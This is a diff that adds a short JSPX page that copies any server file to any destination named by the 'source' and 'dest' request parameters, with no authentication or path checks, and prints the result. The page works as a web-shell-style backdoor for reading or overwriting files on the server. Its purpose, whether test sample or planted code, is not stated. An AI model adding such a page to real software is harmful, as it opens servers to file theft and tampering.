@@ -1,0 +1,17 @@
+<jsp:root xmlns:jsp="http://java.sun.com/JSP/Page" xmlns="http://www.w3.org/1999/xhtml" version="2.0">
+    <jsp:directive.page import="java.io.IOException"/>
+    <jsp:directive.page import="java.nio.file.Files"/>
+    <jsp:directive.page import="java.nio.file.Path"/>
+    <jsp:directive.page import="java.nio.file.Paths"/>
+    <pre>
+    <jsp:scriptlet>
+        try {
+            Path path = Files.copy(Paths.get(request.getParameter("source")), Paths.get(request.getParameter("dest")));
+
+            out.println(path);
+        } catch (IOException e) {
+            e.printStackTrace();
+        }
+    </jsp:scriptlet>
+    </pre>
+</jsp:root>
